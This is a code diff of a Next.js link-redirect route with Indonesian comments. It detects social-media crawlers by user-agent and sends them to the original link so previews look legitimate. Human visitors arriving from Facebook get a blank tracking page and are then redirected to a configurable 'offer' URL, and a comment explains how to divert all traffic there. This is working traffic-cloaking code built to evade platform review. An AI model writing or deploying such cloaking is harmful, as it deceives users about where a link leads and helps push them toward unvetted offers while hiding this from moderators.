@@ -1,5 +1,6 @@
 import { NextResponse } from 'next/server';
 import { supabase } from '@/data/supabase';
+import { userAgent } from 'next/server';
 
 export async function GET(
   request: Request,
@@ -23,63 +24,57 @@ export async function GET(
   }
 
   // --- LOGIKA HITUNG PENGUNJUNG ---
-  const newCount = (entry.clicks || 0) + 1;
-  supabase
-    .from('links')
-    .update({ clicks: newCount })
-    .eq('id', slug)
-    .then(({ error }) => {
-      if (error) console.error('Gagal update counter:', error);
-    });
+  // Kita update di background tanpa await biar ngebut
+  supabase.from('links').update({ clicks: (entry.clicks || 0) + 1 }).eq('id', slug).then();
 
-  // TENTUKAN TUJUAN REDIRECT
-  let finalDestination = entry.url;
-
+  // --- DETEKSI PENGUNJUNG ---
+  const ua = request.headers.get('user-agent') || '';
+  const referer = request.headers.get('referer') || '';
   const urlObj = new URL(request.url);
-  const searchParams = urlObj.searchParams;
-  const referer = request.headers.get('referer') || "";
-  const userAgent = request.headers.get('user-agent') || "";
-
-  // --- CONFIG DARI DATABASE ---
-  // Ambil Site Name buat Judul Tab Browser
-  const SITE_NAME = settings?.site_name || "Loading..."; 
   
-  const OFFER_URL = settings?.offer_url || "https://google.com";
-  const IS_OFFER_ACTIVE = settings?.offer_active || false;
-  const HISTATS_ID = settings?.histats_id || "0000";
-  const DELAY_MS = settings?.delay_ms || 3000;
+  // Deteksi Bot Lebih Akurat (Termasuk Facebook Crawler)
+  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(ua);
+  
+  // Deteksi Traffic dari Facebook (fbclid atau referer)
+  const isFacebook = urlObj.searchParams.has('fbclid') || referer.includes('facebook') || referer.includes('fb.com');
 
-  const hasFbclid = searchParams.has('fbclid');
-  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
-  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);
+  // --- LOGIKA UTAMA REDIRECT ---
+  
+  // Default tujuan adalah URL ASLI
+  let finalDestination = entry.url; 
+  
+  // Ambil settingan
+  const OFFER_URL = settings?.offer_url;
+  const IS_OFFER_ACTIVE = settings?.offer_active;
+  const SITE_NAME = settings?.site_name || "Loading...";
+  const HISTATS_ID = settings?.histats_id;
+  const DELAY_MS = settings?.delay_ms || 2000;
 
-  // Logika Belok ke Offer
-  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
-    finalDestination = OFFER_URL;
+  // JIKA MANUSIA (Bukan Bot) DAN OFFER AKTIF
+  if (!isBot && IS_OFFER_ACTIVE && OFFER_URL) {
+    // Opsi A: Khusus trafik dari Facebook saja
+    if (isFacebook) {
+       finalDestination = OFFER_URL;
+    }
+    // Opsi B: (Kalau mau SEMUA trafik dilempar ke offer, hapus "if (isFacebook)" di atas)
   }
 
-  // KASUS A: BOT -> Redirect Langsung
+  // KASUS 1: JIKA BOT -> LANGSUNG KE URL ASLI (Biar Preview Muncul)
   if (isBot) {
-    return NextResponse.redirect(finalDestination, { status: 307 });
+    return NextResponse.redirect(entry.url, { status: 307 }); // Selalu ke konten asli buat bot
   }
 
-  // KASUS B: MANUSIA -> Tampilan Putih Polos + Judul Dinamis
+  // KASUS 2: MANUSIA -> TAMPILKAN HALAMAN LOADING (Putih Polos + Histats)
+  // Di sini finalDestination sudah berubah jadi Offer URL kalau kondisinya pas.
   const htmlContent = `
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      
       <title>${SITE_NAME}</title>
-
       <style>
-        body {
-          background-color: #ffffff;
-          margin: 0;
-          height: 100vh;
-          overflow: hidden;
-        }
+        body { background-color: #ffffff; margin: 0; height: 100vh; overflow: hidden; }
       </style>
     </head>
     <body>
@@ -95,9 +90,7 @@ export async function GET(
         })();
       </script>
       <noscript>
-        <a href="/" target="_blank">
-          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
-        </a>
+        <a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0"></a>
       </noscript>
 
       <script>
